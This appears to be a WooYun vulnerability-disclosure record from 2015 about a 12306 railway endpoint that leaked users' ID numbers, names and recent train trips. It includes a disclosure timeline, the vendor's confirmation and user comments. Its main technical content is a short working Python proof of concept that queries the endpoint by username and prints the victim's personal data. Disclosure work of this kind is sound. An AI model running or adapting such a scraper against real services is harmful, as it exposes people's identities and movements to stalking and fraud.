{"id": 65536, "wybug_id": "wooyun-2015-0135483", "wybug_title": "12306用户乘车记录/身份证信息/姓名可任意匿名查询(附POC)", "wybug_corp": "12306", "wybug_author": "anonymer", "wybug_date": "2015-08-20 10:20", "wybug_open_date": "2015-10-04 11:28", "wybug_type": "敏感信息泄露", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-04：\t细节向公众公开  简要描述： 12306某处在知道用户信息的情况下，可以查询任意用户最近一个月的乘车记录 详细说明：  \n\n   漏洞证明：  附上POC (不要构造Cookie)usage: python 12306poc.py usernameresult:身份证号码   姓名   出发站   到达站   日期\n#coding:utf-8import argparseimport requestsimport jsonurl='http://dynamic.12306.cn/surweb/registAction.do?method=queryTakeTrainInfo'headers={'user-agent':'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)'}def get_username():    parser = argparse.ArgumentParser()    parser.add_argument('username',help='username of 12306')    args=parser.parse_args()    return args.usernameif __name__=='__main__':    uname=get_username()    if uname:        data={'userName':uname}        reso=requests.post(url,headers=headers,data=data)        res=reso.content        if res.find('resultData')>0:            jsono=json.loads(res)            for x in jsono['resultData']:                info=x['info'].split('##1##')                print info[0],'\\t',info[1],'\\t',x['from_station_name'],'\\t',x['to_station_name'],'\\t',x['train_date']        else:            print 'no data'\n\n\n\n\n   修复方案：  过滤敏感信息   版权声明：转载请注明来源 anonymer@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-08-20 11:27 厂商回复： 谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-20 10:45 |    \t\tsuolong \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:11        | 我有个野心，就是要成为世界第一的贱士！！)\t\t \n  不会炸么？    \n     2015-08-20 10:47 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:225 漏洞数:27        | 杀猪刀啊，杀猪刀啊)\t\t \n  CCTV看这里    \n     2015-08-20 11:11 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  卧槽，这个挺厉害的，尼玛呀    \n     2015-08-20 11:12 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  CCTV！这里    \n     2015-08-20 11:16 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:47        | [code]心若没有栖息的地方，走到哪里都是在...)\t\t \n  标题改了！！！ccav看这里。。    \n     2015-08-20 11:19 |    \t\tanonymer \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:8        | http://www.google.com)\t\t \n  @随风的风 是啊，标题被改了好多次了。。。。    \n     2015-08-20 11:21 |    \t\t番茄炒蛋 \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:31        | test)\t\t \n  CCAV    \n     2015-08-20 11:22 |    \t\t啊L川 \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:39        | 菜鸟 ，菜渣， 菜呀！)\t\t \n  卧槽 关注    \n     2015-08-20 11:23 |    \t\t番茄师傅 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:59        | http://www.tomatoyu.com/)\t\t \n  CCTV！这里    \n     2015-08-20 11:24 |    \t\t小红猪 \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:30        | Wow~~~哈哈~~~)\t\t \n  牛逼    \n     2015-08-20 11:28 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  这是个高危    \n     2015-08-20 11:34 |    \t\twps2015 \t\t\t( 普通白帽子  |\t\t\t        Rank:455 漏洞数:64        | 不叫一日荒废)\t\t \n  不到四分之二呀    \n     2015-08-20 13:02 |    \t\t追寻 \t\t\t( 实习白帽子  |\t\t\t        Rank:86 漏洞数:18        | 闭关修炼)\t\t \n  66666666    \n     2015-08-20 13:55 |    \t\tSunnyDoll \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:10        | 职业搬砖工)\t\t \n  CCTV看这里     \n     2015-08-20 14:19 |    \t\tgoubuli \t\t\t( 普通白帽子  |\t\t\t        Rank:324 漏洞数:61        )\t\t \n  高危的才5分    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}